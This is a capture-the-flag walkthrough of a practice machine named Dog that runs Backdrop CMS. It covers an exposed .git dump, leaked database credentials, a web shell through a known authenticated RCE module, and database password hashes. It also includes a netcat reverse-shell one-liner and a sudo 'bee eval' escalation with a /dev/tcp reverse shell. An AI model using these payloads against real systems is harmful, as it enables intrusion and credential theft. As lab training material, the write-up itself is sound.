1, Recon
Port scan 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Page check
![](images/Pasted%20image%2020250309185909.png)
We can get the `robots.txt`
```
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html
#
# For syntax checking, see:
# http://www.robotstxt.org/checker.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```

And from the nmap scan, we can get the `.git`
So let's use `git-dump` to catch it.
```
git-dumper http://10.10.11.58:80/.git/ ./git-repo-dump

drwxrwxr-x 8 wither wither  4096 Mar  9 19:00 .
drwxrwxr-x 4 wither wither  4096 Mar  9 19:00 ..
drwxrwxr-x 7 wither wither  4096 Mar  9 19:00 .git
-rwxrwxr-x 1 wither wither 18092 Mar  9 19:00 LICENSE.txt
-rwxrwxr-x 1 wither wither  5285 Mar  9 19:00 README.md
drwxrwxr-x 9 wither wither  4096 Mar  9 19:00 core
drwxrwxr-x 7 wither wither  4096 Mar  9 19:00 files
-rwxrwxr-x 1 wither wither   578 Mar  9 19:00 index.php
drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 layouts
-rwxrwxr-x 1 wither wither  1198 Mar  9 19:00 robots.txt
-rwxrwxr-x 1 wither wither 21732 Mar  9 19:00 settings.php
drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 sites
drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 themes
```

From the `settings.php`, I found a interesting credit here.
`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`

We have get one of the valid password, so we want to try to get the valid username
In this place, `BackDropScan` would be a good choice here, or we can also use burpsuite to check them.
`https://github.com/FisMatHack/BackDropScan.git`

Then we successfully get the valid username `tiffany@dog.htb`
And we can also use `tiffany@dog.htb:BackDropJ2024DS2024` to login to the dashboard.
![](images/Pasted%20image%2020250309193246.png)
Let's enumerate the version of this CMS
I found that from `http://10.10.11.58/?q=admin/reports/status`
![](images/Pasted%20image%2020250309193358.png)
Then by searching from exploit-db, we found
`Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)`
Run this exploit script, we can get a directory `shell`, we need to compress it into a .tar.gz
Install it via http://dog.htb/?q=admin/installer/manual --> "Upload a module, theme, or layout archive to install" (I had to upload it as a .tar as he did not accept .zip), then directly go to http://dog.htb/modules/shell/shell.php
Then we can get the web-shell here.
![](images/Pasted%20image%2020250309200845.png)

Then we can run the command to get the reverse shell.
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 443 >/tmp/f`

Then we get the reverse shell as `www-data`
Remember we have get the database credit before
`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`
Then we can enumerate the database here
```
-------+------------+--------+----------+----------+---------+----------------------------+------------+
| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1741511391 | 1741508562 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+

```

And also, we need to check `/etc/passwd` to find the valid user from this machine
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

```

`johncusack`would be our target here.
Very luckily, we can just use the credit to switch `johncusack:BackDropJ2024DS2024`

3, shell as root
I would like check `sudo -l` firstly
```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

By checking the help document of `bee`,  we can find something useful
```
1, eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

2, --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

So the payload command would be 
get the reverse shell:
sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"');"

sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
```